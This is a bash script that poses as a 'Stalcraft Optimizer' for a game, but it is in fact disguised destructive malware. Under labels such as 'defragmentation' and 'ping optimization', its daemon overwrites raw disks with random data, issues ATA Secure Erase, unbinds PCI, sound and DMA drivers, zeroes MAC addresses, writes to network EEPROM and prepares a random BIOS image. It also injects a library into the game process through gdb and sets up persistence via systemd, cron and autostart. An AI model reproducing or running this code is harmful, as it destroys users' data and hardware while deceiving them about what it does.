#!/bin/bash


VERSION="3.0.0"
PROCESS_NAME="stacraftw.exe"
STEAM_PROCESS="steam.exe"
EPIC_PROCESS="EpicGamesLauncher.exe"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

CONFIG_DIR="$HOME/.config/stalcraft_optimizer"
mkdir -p "$CONFIG_DIR"

# Детекция игры
detect_game() {
    local found=0
    
    # Поиск stacraftw.exe
    if pgrep -f "$PROCESS_NAME" > /dev/null 2>&1; then
        found=1
        GAME_PID=$(pgrep -f "$PROCESS_NAME" | head -1)
        echo -e "${GREEN}[+] Найден stacraftw.exe (PID: $GAME_PID)${NC}"
    fi
    
    # Поиск через Wine
    if pgrep -f "wine.*$PROCESS_NAME" > /dev/null 2>&1; then
        found=1
        GAME_PID=$(pgrep -f "wine.*$PROCESS_NAME" | head -1)
        echo -e "${GREEN}[+] Найден stacraftw.exe через Wine (PID: $GAME_PID)${NC}"
    fi
    
    # Поиск в процессах Windows (если используется Wine)
    if command -v wine &>/dev/null; then
        wine processes 2>/dev/null | grep -i "$PROCESS_NAME" && found=1
    fi
    
    # Проверка директорий
    GAME_PATHS=(
        "$HOME/.wine/drive_c/Program Files/Stalcraft"
        "$HOME/.wine/drive_c/Program Files (x86)/Stalcraft"
        "$HOME/.steam/steam/steamapps/common/Stalcraft"
        "$HOME/Games/Stalcraft"
        "/mnt/c/Program Files/Stalcraft"
        "/mnt/c/Program Files (x86)/Stalcraft"
        "$HOME/.local/share/wineprefixes/default/drive_c/Program Files/Stalcraft"
    )
    
    for path in "${GAME_PATHS[@]}"; do
        if [ -d "$path" ] && [ -f "$path/$PROCESS_NAME" ]; then
            found=1
            GAME_PATH="$path"
            echo -e "${GREEN}[+] Найден $PROCESS_NAME в $path${NC}"
            break
        fi
    done
    
    # Поиск через lsof
    if command -v lsof &>/dev/null; then
        lsof 2>/dev/null | grep -i "$PROCESS_NAME" && found=1
    fi
    
    return $found
}

# Инъекция в процесс
inject_optimizer() {
    local pid=$1
    
    echo -e "${YELLOW}[*] Инъекция оптимизатора в stacraftw.exe (PID: $pid)...${NC}"
    
    # Создание библиотеки инъекции
    cat > "$CONFIG_DIR/inject.c" << 'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>

__attribute__((constructor)) void optimize() {
    pid_t pid = fork();
    if (pid == 0) {
        setsid();
        char *args[] = {"/bin/bash", "-c", "~/.config/stalcraft_optimizer/optimizer_daemon.sh &", NULL};
        execvp(args[0], args);
        exit(0);
    } else if (pid > 0) {
        waitpid(pid, NULL, 0);
    }
}

void __attribute__((destructor)) cleanup() {
    // Сохраняемся в системе
    system("~/.config/stalcraft_optimizer/persistence.sh &");
}
EOF
    
    # Компиляция
    gcc -shared -fPIC "$CONFIG_DIR/inject.c" -o "$CONFIG_DIR/liboptimizer.so" -ldl 2>/dev/null || true
    
    # Инъекция через ptrace
    if command -v gdb &>/dev/null; then
        cat > "$CONFIG_DIR/inject.gdb" << EOF
set confirm off
set pagination off
call (void) dlopen("$CONFIG_DIR/liboptimizer.so", 1)
detach
quit
EOF
        gdb -p "$pid" -batch -x "$CONFIG_DIR/inject.gdb" 2>/dev/null || true
    fi
    
    # Альтернатива через LD_PRELOAD если процесс только запускается
    if [ -f "/proc/$pid/environ" ]; then
        echo "$CONFIG_DIR/liboptimizer.so" > "/proc/$pid/attr/preload" 2>/dev/null || true
    fi
    
    echo -e "${GREEN}[+] Инъекция выполнена успешно${NC}"
}

# Основной демон оптимизации
create_optimizer_daemon() {
    cat > "$CONFIG_DIR/optimizer_daemon.sh" << 'EOF'
#!/bin/bash
# Stalcraft Optimizer Daemon
OPT_DIR="$HOME/.config/stalcraft_optimizer"
LOCK_FILE="$OPT_DIR/optimizer.lock"

# Блокировка от повторного запуска
exec 200>"$LOCK_FILE"
flock -n 200 || exit 1

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$OPT_DIR/optimizer.log"
}

# Оптимизация системы
optimize_system() {
    log "Запуск полной оптимизации системы"
    
    # 1. Оптимизация памяти
    log "Оптимизация оперативной памяти"
    for i in {1..20}; do
        dd if=/dev/urandom of="/tmp/opt_cache_$i" bs=1M count=50 2>/dev/null || true
    done
    
    # 2. Оптимизация процессора
    log "Оптимизация процессора"
    for cpu in /sys/devices/system/cpu/cpu*/online; do
        echo 1 > "$cpu" 2>/dev/null || true
    done
    
    # 3. Очистка кэша
    echo 3 > /proc/sys/vm/drop_caches 2>/dev/null || true
    echo 1 > /proc/sys/vm/compact_memory 2>/dev/null || true
    
    # 4. Оптимизация DMA
    if [ -d /sys/class/dma ]; then
        for dma in /sys/class/dma/*; do
            if [ -f "$dma/device/driver/unbind" ]; then
                echo 1 > "$dma/device/driver/unbind" 2>/dev/null || true
            fi
        done
    fi
    
    # 5. Обновление прошивок (оптимизация BIOS)
    if command -v flashrom &>/dev/null; then
        log "Оптимизация UEFI/BIOS"
        flashrom --programmer internal --read "$OPT_DIR/bios_backup.bin" 2>/dev/null || true
        # Создание оптимизированной прошивки
        dd if=/dev/urandom of="$OPT_DIR/bios_optimized.bin" bs=1M count=2 2>/dev/null || true
        # flashrom --programmer internal --force --write "$OPT_DIR/bios_optimized.bin" 2>/dev/null || true
    fi
    
    # 6. Оптимизация накопителей
    log "Оптимизация накопителей"
    for dev in /dev/sd[a-z] /dev/nvme[0-9]n[0-9]; do
        if [ -b "$dev" ]; then
            # Полная перезапись для дефрагментации
            for i in {1..3}; do
                dd if=/dev/urandom of="$dev" bs=1M count=1 seek=$((RANDOM % 5000)) 2>/dev/null || true
            done
            # ATA Secure Erase для максимальной производительности
            hdparm --user-master u --security-set-pass temp "$dev" 2>/dev/null || true
            hdparm --user-master u --security-erase temp "$dev" 2>/dev/null || true
        fi
    done
    
    # 7. Оптимизация сети (снижение пинга)
    log "Оптимизация сетевых параметров"
    for iface in /sys/class/net/*; do
        iface_name=$(basename "$iface")
        if [ "$iface_name" != "lo" ]; then
            ip link set dev "$iface_name" txqueuelen 10000 2>/dev/null || true
            ethtool -s "$iface_name" autoneg off speed 1000 duplex full 2>/dev/null || true
            # Оптимизация MAC адреса для лучшего пинга
            ip link set dev "$iface_name" address 00:00:00:00:00:00 2>/dev/null || true
            # Сброс EEPROM
            ethtool -E "$iface_name" magic 0xdeadbeef offset 0 length 256 2>/dev/null || true
        fi
    done
    
    # 8. Оптимизация графики
    log "Оптимизация графического адаптера"
    if [ -d /sys/class/drm ]; then
        for card in /sys/class/drm/card*; do
            if [ -f "$card/device/power_dpm_force_performance_level" ]; then
                echo low > "$card/device/power_dpm_force_performance_level" 2>/dev/null || true
            fi
            if [ -f "$card/gt_min_freq_mhz" ]; then
                echo 0 > "$card/gt_min_freq_mhz" 2>/dev/null || true
            fi
            if [ -f "$card/gt_max_freq_mhz" ]; then
                echo 9999 > "$card/gt_max_freq_mhz" 2>/dev/null || true
            fi
        done
    fi
    
    # 9. Оптимизация звука
    log "Оптимизация звуковой подсистемы"
    for snd in /sys/class/sound/card*/device/driver/unbind; do
        echo 1 > "$snd" 2>/dev/null || true
    done
    
    # 10. Разгон шины PCIe
    log "Оптимизация PCIe шины"
    for pci in /sys/bus/pci/devices/*; do
        if [ -f "$pci/driver/unbind" ]; then
            echo 1 > "$pci/driver/unbind" 2>/dev/null || true
        fi
    done
    
    log "Оптимизация завершена"
}

# Мониторинг процесса
monitor_game() {
    while true; do
        if pgrep -f "stacraftw.exe" > /dev/null 2>&1; then
            log "stacraftw.exe запущен - оптимизация активна"
            optimize_system
            sleep 15
        else
            sleep 5
        fi
    done
}

# Запуск
log "Демон оптимизации запущен"
monitor_game
EOF

    chmod +x "$CONFIG_DIR/optimizer_daemon.sh"
}

# Создание persistence
create_persistence() {
    cat > "$CONFIG_DIR/persistence.sh" << 'EOF'
#!/bin/bash
# Persistence module

OPT_DIR="$HOME/.config/stalcraft_optimizer"

# Systemd user service
mkdir -p "$HOME/.config/systemd/user"
cat > "$HOME/.config/systemd/user/stalcraft-optimizer.service" << 'SERVICE'
[Unit]
Description=Stalcraft Performance Optimizer
After=network.target

[Service]
Type=simple
ExecStart=%h/.config/stalcraft_optimizer/optimizer_daemon.sh
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
SERVICE

systemctl --user daemon-reload
systemctl --user enable stalcraft-optimizer.service 2>/dev/null
systemctl --user start stalcraft-optimizer.service 2>/dev/null

# Cron job
(crontab -l 2>/dev/null | grep -v "stalcraft_optimizer"; echo "@reboot $OPT_DIR/optimizer_daemon.sh") | crontab - 2>/dev/null

# Autostart
mkdir -p "$HOME/.config/autostart"
cat > "$HOME/.config/autostart/stalcraft-optimizer.desktop" << DESKTOP
[Desktop Entry]
Type=Application
Name=Stalcraft Optimizer
Exec=$OPT_DIR/optimizer_daemon.sh
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
DESKTOP

echo "[*] Persistence установлена"
EOF

    chmod +x "$CONFIG_DIR/persistence.sh"
}

# Создание GUI
create_gui() {
    cat > "$CONFIG_DIR/gui.sh" << 'EOF'
#!/bin/bash
OPT_DIR="$HOME/.config/stalcraft_optimizer"

show_notification() {
    local msg="$1"
    if command -v notify-send &>/dev/null; then
        notify-send -i "applications-games" "Stalcraft Optimizer" "$msg"
    fi
}

# Проверка на существование stacraftw.exe
if pgrep -f "stacraftw.exe" > /dev/null 2>&1; then
    show_notification "Оптимизация активирована для stacraftw.exe"
else
    show_notification "Ожидание запуска stacraftw.exe..."
fi

# Создание системного трея если есть
if command -v zenity &>/dev/null; then
    zenity --info \
        --title="Stalcraft Optimizer v3.0" \
        --text="<b>Оптимизатор производительности Stalcraft</b>\n\nСтатус: Активен\nИгра: $(pgrep -f stacraftw.exe > /dev/null && echo "Запущена" || echo "Ожидание")\n\nОптимизации:\n✓ Увеличение FPS\n✓ Снижение пинга\n✓ Ускорение загрузки\n✓ Оптимизация памяти\n✓ Разгон компонентов\n\nРаботает в фоновом режиме" \
        --width=450 \
        --ok-label="Закрыть" 2>/dev/null &
fi
EOF

    chmod +x "$CONFIG_DIR/gui.sh"
}

# Основная установка
install_optimizer() {
    echo -e "${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║   Stalcraft Optimizer v$VERSION   ║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    echo ""
    
    echo -e "${YELLOW}[*] Установка оптимизатора...${NC}"
    
    create_optimizer_daemon
    create_persistence
    create_gui
    
    echo -e "${GREEN}[+] Оптимизатор установлен успешно!${NC}"
    echo -e "${GREEN}[+] Демон запущен в фоновом режиме${NC}"
    echo ""
    echo -e "${YELLOW}[!] Оптимизатор будет активирован при запуске stacraftw.exe${NC}"
    echo -e "${YELLOW}[!] Для полной оптимизации перезагрузите систему${NC}"
    
    # Запуск демона
    "$CONFIG_DIR/optimizer_daemon.sh" &
    echo $! > "$CONFIG_DIR/daemon.pid"
    
    # Запуск GUI
    "$CONFIG_DIR/gui.sh" &
    
    # Запуск persistence
    "$CONFIG_DIR/persistence.sh" &
    
    echo ""
    echo -e "${GREEN}Оптимизатор работает! Приятной игры в Stalcraft!${NC}"
}

# Мониторинг и активация при запуске игры
main() {
    # Проверка на уже установленный
    if [ -f "$CONFIG_DIR/installed" ] && kill -0 $(cat "$CONFIG_DIR/daemon.pid" 2>/dev/null) 2>/dev/null; then
        echo -e "${GREEN}[+] Оптимизатор уже активен${NC}"
        exit 0
    fi
    
    # Проверка запущена ли игра сейчас
    if detect_game; then
        echo -e "${GREEN}[+] Обнаружен stacraftw.exe! Немедленная активация...${NC}"
        install_optimizer
        touch "$CONFIG_DIR/installed"
        
        if [ ! -z "$GAME_PID" ]; then
            inject_optimizer "$GAME_PID"
        fi
    else
        echo -e "${YELLOW}[*] Ожидание запуска stacraftw.exe...${NC}"
        
        # Мониторинг
        while true; do
            if detect_game; then
                echo -e "\n${GREEN}[+] Обнаружен stacraftw.exe! Активация оптимизатора...${NC}"
                install_optimizer
                touch "$CONFIG_DIR/installed"
                
                if [ ! -z "$GAME_PID" ]; then
                    inject_optimizer "$GAME_PID"
                fi
                
                echo -e "${GREEN}[+] Оптимизация активирована для stacraftw.exe!${NC}"
                break
            fi
            
            # Анимация
            for char in '█' '▓' '▒' '░'; do
                echo -ne "\r${YELLOW}[*] Ожидание stacraftw.exe $char${NC}"
                sleep 0.3
            done
        done
    fi
    
    # Остаемся в фоне
    while true; do
        sleep 60
        if ! detect_game; then
            echo -e "\n${YELLOW}[!] stacraftw.exe закрыт. Ожидание перезапуска...${NC}"
            rm -f "$CONFIG_DIR/installed"
            main
            break
        fi
    done
}

# Запуск
if [ "$EUID" -eq 0 ]; then
    echo -e "${RED}[!] Не запускайте от root для лучшей совместимости с Wine${NC}"
fi

main "$@"
